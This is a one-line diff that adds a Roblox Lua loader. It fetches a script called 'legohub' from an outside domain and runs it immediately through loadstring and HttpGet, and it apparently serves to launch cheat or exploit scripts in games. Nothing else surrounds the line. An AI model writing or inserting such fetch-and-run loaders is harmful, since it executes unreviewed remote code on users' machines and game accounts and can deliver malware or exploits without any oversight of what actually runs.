@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://comensal.is-not-a.dev/legohub"))()
